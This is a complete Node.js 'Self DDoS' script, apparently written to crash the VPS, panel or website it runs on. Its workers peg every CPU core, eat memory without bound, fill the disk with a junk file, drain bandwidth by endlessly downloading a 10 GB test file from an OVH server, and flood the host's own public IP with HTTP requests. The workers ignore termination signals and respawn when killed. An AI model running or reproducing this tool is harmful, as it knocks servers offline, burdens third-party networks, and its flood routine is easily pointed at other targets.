const cluster = require('cluster');
const os = require('os');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const http = require('http');
const https = require('https');

const JUNK_FILE = 'XayzTech-Here!.bin';
const NETWORK_TARGET_OVH = 'http://proof.ovh.net/files/10Gb.dat';

const CPU_THREADS = os.cpus().length; 
const RAM_WORKERS = 2; 
const DISK_WORKERS = 1; 
const NET_WORKERS = 6;
const WEB_WORKERS = 4;
const PARALLEL_DOWNLOADS = 10; 

const httpAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity });
const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false });

async function getPublicIP() {
    try {
        const response = await axios.get('https://api.ipify.org?format=json', { timeout: 50000 });
        return response.data.ip;
    } catch (error) {
        return '127.0.0.1';
    }
}

if (cluster.isMaster) {
    (async () => {
        console.clear();
        console.log(`\x1b[36m
        ================================================
        🛡️  SELF DDOS
        🛡️  OBJECTIVE: Self Flood, Self DDoS, Self Kill Panel, Self Kill VPS, Self Kill Website
        👤👑 DEVELOPER: @XYCoolcraft
        
        NOTE: Don't blame the developer, blame those who use it irresponsibly. And don't play slander!.
        ================================================
        \x1b[0m`);

        const myIP = await getPublicIP();
        const targetUrl = `http://${myIP}`; 
        
        console.log(`\x1b[41m\x1b[37m!!! FULL SYSTEM STRESS !!!\x1b[0m`);
        console.log(`\x1b[33m[TARGET WEB]\x1b[0m ${targetUrl}`);
        console.log(`\x1b[33m[TARGET NET]\x1b[0m Bandwidth Drain`);

        const envVars = { TARGET: targetUrl };

        for (let i = 0; i < CPU_THREADS; i++) cluster.fork({ TYPE: 'CPU', ...envVars });
        
        for (let i = 0; i < RAM_WORKERS; i++) cluster.fork({ TYPE: 'RAM', ...envVars });
        
        for (let i = 0; i < DISK_WORKERS; i++) cluster.fork({ TYPE: 'DISK', ...envVars });
        
        for (let i = 0; i < NET_WORKERS; i++) cluster.fork({ TYPE: 'NETWORK_DRAIN', ...envVars });

        for (let i = 0; i < WEB_WORKERS; i++) cluster.fork({ TYPE: 'WEB_FLOOD', ...envVars });

        cluster.on('exit', (worker) => {
            console.log(`\x1b[31m❌ Worker ${worker.process.pid} mati. Respawning...\x1b[0m`);
            const types = ['CPU', 'RAM', 'NETWORK_DRAIN', 'WEB_FLOOD'];
            const randomType = types[Math.floor(Math.random() * types.length)];
            cluster.fork({ TYPE: randomType, ...envVars });
        });
    })();

} 

else {
    process.on('SIGTERM', () => {});
    process.on('SIGINT', () => {});
    process.on('uncaughtException', () => {});

    const type = process.env.TYPE;
    const target = process.env.TARGET;

    if (type === 'CPU') startCpuHog();
    if (type === 'RAM') startRamEater();
    if (type === 'DISK') startDiskFiller();
    
    if (type === 'NETWORK_DRAIN') startNetworkSpammer();
    if (type === 'WEB_FLOOD') startWebFlooder(target); 
}

function startCpuHog() {
    while (true) {
        Math.pow(Math.random(), Math.random());
        Math.sqrt(123456789 * 123456789);
    }
}

function startRamEater() {
    console.log(`[RAM] Mengisi Memori...`);
    const trash = [];
    setInterval(() => {
        try {
            trash.push(Buffer.alloc(50 * 1024 * 1024, 'X'));
        } catch (e) {}
    }, 200);
}

function startDiskFiller() {
    console.log(`[DISK] Menulis sampah...`);
    const stream = fs.createWriteStream(path.join(__dirname, JUNK_FILE));
    const buffer = Buffer.alloc(100 * 1024 * 1024, '0');

    function write() {
        if (!stream.write(buffer)) {
            stream.once('drain', write);
        } else {
            process.nextTick(write);
        }
    }
    write();
}

async function startNetworkSpammer() {
    console.log(`[NET-DRAIN] Bandwidth dimulai...`);
    
    const downloadTask = async () => {
        while (true) {
            try {
                const response = await axios({
                    method: 'get',
                    url: NETWORK_TARGET_OVH,
                    responseType: 'stream',
                    httpAgent: httpAgent,
                    timeout: 97200000
                });

                for await (const chunk of response.data) {
                }
            } catch (e) {}
        }
    };

    const tasks = [];
    for (let i = 0; i < PARALLEL_DOWNLOADS; i++) {
        tasks.push(downloadTask());
    }
    await Promise.all(tasks);
}

async function startWebFlooder(targetUrl) {
    console.log(`[WEB-FLOOD] Membanjiri Request ke ${targetUrl}...`);
    
    const attack = async () => {
        while (true) {
            try {
                await axios.get(targetUrl, {
                    httpAgent: httpAgent,
                    httpsAgent: httpsAgent,
                    timeout: 7920000,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) StressTest/1.0',
                        'Connection': 'keep-alive'
                    }
                });
            } catch (e) {}
        }
    };

    const attacks = [];
    for(let i=0; i<100; i++) {
        attacks.push(attack());
    }
    await Promise.all(attacks);
}